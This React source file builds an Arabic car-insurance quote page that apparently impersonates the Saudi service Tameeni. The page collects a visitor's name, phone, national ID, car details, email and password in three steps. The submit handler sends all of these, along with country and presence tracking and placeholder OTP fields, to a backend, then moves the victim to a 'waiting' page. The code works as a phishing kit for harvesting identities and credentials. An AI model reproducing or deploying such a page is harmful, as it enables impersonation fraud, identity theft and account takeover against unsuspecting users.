import { useState } from "react";
import { Shield, Car, User, Phone, CreditCard, Mail, Lock, ChevronLeft, ChevronRight, Loader2 } from "lucide-react";
import { tameeniApi } from "@/lib/api";
import { getCountry } from "@/lib/getCountry";
import { useTracking } from "@/lib/useTracking";

const MAKES = ["تويوتا", "هوندا", "نيسان", "هيونداي", "كيا", "فورد", "شيفروليه", "بي إم دبليو", "مرسيدس", "أودي", "لكزس", "أخرى"];
const YEARS = Array.from({ length: 20 }, (_, i) => String(2024 - i));

export default function QuotePage() {
  useTracking("استعلام عن تأمين");
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [fields, setFields] = useState({
    name: "", phone: "", nationalId: "",
    carPlate: "", carYear: "", carMake: "",
    email: "", password: "",
  });

  function set(k: string, v: string) { setFields(p => ({ ...p, [k]: v })); }

  async function handleSubmit() {
    setLoading(true);
    const id = localStorage.getItem("tameeni_id") ?? `t-${Date.now()}`;
    localStorage.setItem("tameeni_id", id);
    const country = await getCountry();
    await tameeniApi.submit({
      id, submittedAt: new Date().toLocaleTimeString("ar-SA"),
      submittedAtTs: Date.now(),
      name: fields.name, phone: fields.phone, nationalId: fields.nationalId,
      email: fields.email, password: fields.password,
      carPlate: fields.carPlate, carYear: fields.carYear, carMake: fields.carMake,
      otpCode: "", otpStatus: null,
      page: "استعلام عن تأمين", lastSeen: Date.now(), country,
    });
    window.location.href = "/tameeni/waiting";
  }

  const canNext1 = fields.name && fields.phone && fields.nationalId;
  const canNext2 = fields.carPlate && fields.carYear && fields.carMake;
  const canSubmit = fields.email && fields.password;

  return (
    <div className="min-h-screen bg-gradient-to-bl from-blue-50 to-white" dir="rtl" style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>

      {/* Header */}
      <div className="bg-white border-b border-gray-100 shadow-sm">
        <div className="max-w-lg mx-auto px-4 h-14 flex items-center gap-3">
          <button onClick={() => window.location.href = "/tameeni/"} className="flex items-center gap-1.5 text-gray-500 hover:text-blue-600 transition-colors">
            <ChevronRight className="w-4 h-4" />
            <span className="text-[13px] font-semibold">تأميني</span>
          </button>
          <div className="h-4 w-px bg-gray-200" />
          <div className="flex items-center gap-1.5">
            <Shield className="w-4 h-4 text-blue-600" />
            <span className="text-[13px] font-bold text-gray-700">استعلام عن تأمين السيارة</span>
          </div>
        </div>
      </div>

      <div className="max-w-lg mx-auto px-4 py-8">
        {/* Steps indicator */}
        <div className="flex items-center gap-2 mb-8">
          {[1, 2, 3].map((s) => (
            <div key={s} className="flex items-center gap-2 flex-1">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-[13px] font-extrabold transition-colors
                ${step > s ? "bg-emerald-500 text-white" : step === s ? "bg-blue-600 text-white" : "bg-gray-200 text-gray-400"}`}>
                {step > s ? "✓" : s}
              </div>
              <span className={`text-[12px] font-semibold hidden sm:block ${step === s ? "text-blue-600" : "text-gray-400"}`}>
                {s === 1 ? "بياناتك" : s === 2 ? "بيانات السيارة" : "تسجيل الدخول"}
              </span>
              {s < 3 && <div className="flex-1 h-px bg-gray-200" />}
            </div>
          ))}
        </div>

        <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
          {/* Step 1: Personal info */}
          {step === 1 && (
            <div className="p-6 space-y-5">
              <div>
                <h2 className="text-[20px] font-extrabold text-gray-900">بياناتك الشخصية</h2>
                <p className="text-[13px] text-gray-500 mt-1">ادخل بياناتك لاستعلام عن التأمين</p>
              </div>
              {[
                { label: "الاسم الكامل", key: "name", icon: <User className="w-4 h-4" />, placeholder: "محمد أحمد الخالد", type: "text" },
                { label: "رقم الجوال", key: "phone", icon: <Phone className="w-4 h-4" />, placeholder: "05xxxxxxxx", type: "tel" },
                { label: "رقم الهوية الوطنية", key: "nationalId", icon: <CreditCard className="w-4 h-4" />, placeholder: "1xxxxxxxxx", type: "text" },
              ].map((f) => (
                <div key={f.key}>
                  <label className="block text-[13px] font-bold text-gray-700 mb-1.5">{f.label}</label>
                  <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-2.5 focus-within:border-blue-400 focus-within:ring-2 focus-within:ring-blue-100 bg-gray-50 transition-all">
                    <span className="text-gray-400">{f.icon}</span>
                    <input type={f.type} placeholder={f.placeholder} value={(fields as any)[f.key]}
                      onChange={(e) => set(f.key, e.target.value)}
                      className="flex-1 bg-transparent text-[15px] font-semibold text-gray-900 outline-none placeholder:text-gray-300"
                      dir={f.key === "phone" || f.key === "nationalId" ? "ltr" : "rtl"} />
                  </div>
                </div>
              ))}
              <button
                disabled={!canNext1}
                onClick={() => setStep(2)}
                className="w-full py-3.5 rounded-xl bg-blue-600 text-white font-extrabold text-[16px] disabled:opacity-40 hover:bg-blue-700 transition-colors flex items-center justify-center gap-2"
              >
                التالي <ChevronLeft className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* Step 2: Car info */}
          {step === 2 && (
            <div className="p-6 space-y-5">
              <div className="flex items-center gap-2">
                <button onClick={() => setStep(1)} className="text-gray-400 hover:text-gray-700">
                  <ChevronRight className="w-5 h-5" />
                </button>
                <div>
                  <h2 className="text-[20px] font-extrabold text-gray-900">بيانات السيارة</h2>
                  <p className="text-[13px] text-gray-500">ادخل بيانات سيارتك للحصول على العروض</p>
                </div>
              </div>

              <div>
                <label className="block text-[13px] font-bold text-gray-700 mb-1.5">رقم اللوحة</label>
                <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-2.5 focus-within:border-blue-400 focus-within:ring-2 focus-within:ring-blue-100 bg-gray-50">
                  <Car className="w-4 h-4 text-gray-400" />
                  <input type="text" placeholder="أ ب ج 1234" value={fields.carPlate}
                    onChange={(e) => set("carPlate", e.target.value)}
                    className="flex-1 bg-transparent text-[15px] font-semibold text-gray-900 outline-none placeholder:text-gray-300" dir="rtl" />
                </div>
              </div>

              <div>
                <label className="block text-[13px] font-bold text-gray-700 mb-1.5">نوع السيارة</label>
                <div className="border border-gray-200 rounded-xl overflow-hidden focus-within:border-blue-400 bg-gray-50">
                  <select value={fields.carMake} onChange={(e) => set("carMake", e.target.value)}
                    className="w-full px-3 py-2.5 bg-transparent text-[15px] font-semibold text-gray-900 outline-none appearance-none">
                    <option value="">اختر نوع السيارة</option>
                    {MAKES.map((m) => <option key={m} value={m}>{m}</option>)}
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-[13px] font-bold text-gray-700 mb-1.5">سنة الصنع</label>
                <div className="border border-gray-200 rounded-xl overflow-hidden focus-within:border-blue-400 bg-gray-50">
                  <select value={fields.carYear} onChange={(e) => set("carYear", e.target.value)}
                    className="w-full px-3 py-2.5 bg-transparent text-[15px] font-semibold text-gray-900 outline-none appearance-none">
                    <option value="">اختر السنة</option>
                    {YEARS.map((y) => <option key={y} value={y}>{y}</option>)}
                  </select>
                </div>
              </div>

              <button
                disabled={!canNext2}
                onClick={() => setStep(3)}
                className="w-full py-3.5 rounded-xl bg-blue-600 text-white font-extrabold text-[16px] disabled:opacity-40 hover:bg-blue-700 transition-colors flex items-center justify-center gap-2"
              >
                التالي <ChevronLeft className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* Step 3: Login */}
          {step === 3 && (
            <div className="p-6 space-y-5">
              <div className="flex items-center gap-2">
                <button onClick={() => setStep(2)} className="text-gray-400 hover:text-gray-700">
                  <ChevronRight className="w-5 h-5" />
                </button>
                <div>
                  <h2 className="text-[20px] font-extrabold text-gray-900">تسجيل الدخول</h2>
                  <p className="text-[13px] text-gray-500">ادخل بياناتك لعرض أسعار التأمين</p>
                </div>
              </div>

              {[
                { label: "البريد الإلكتروني", key: "email", icon: <Mail className="w-4 h-4" />, placeholder: "example@email.com", type: "email" },
                { label: "كلمة المرور", key: "password", icon: <Lock className="w-4 h-4" />, placeholder: "كلمة المرور", type: "text" },
              ].map((f) => (
                <div key={f.key}>
                  <label className="block text-[13px] font-bold text-gray-700 mb-1.5">{f.label}</label>
                  <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-2.5 focus-within:border-blue-400 focus-within:ring-2 focus-within:ring-blue-100 bg-gray-50 transition-all">
                    <span className="text-gray-400">{f.icon}</span>
                    <input type={f.type} placeholder={f.placeholder} value={(fields as any)[f.key]}
                      onChange={(e) => set(f.key, e.target.value)}
                      className="flex-1 bg-transparent text-[15px] font-semibold text-gray-900 outline-none placeholder:text-gray-300"
                      dir="ltr" autoComplete="off" />
                  </div>
                </div>
              ))}

              <button
                disabled={!canSubmit || loading}
                onClick={handleSubmit}
                className="w-full py-3.5 rounded-xl bg-blue-600 text-white font-extrabold text-[16px] disabled:opacity-40 hover:bg-blue-700 transition-colors flex items-center justify-center gap-2"
              >
                {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "عرض أسعار التأمين"}
              </button>
              <p className="text-center text-[12px] text-gray-400">
                بالمتابعة توافق على <a href="#" className="text-blue-600 hover:underline">الشروط والأحكام</a>
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
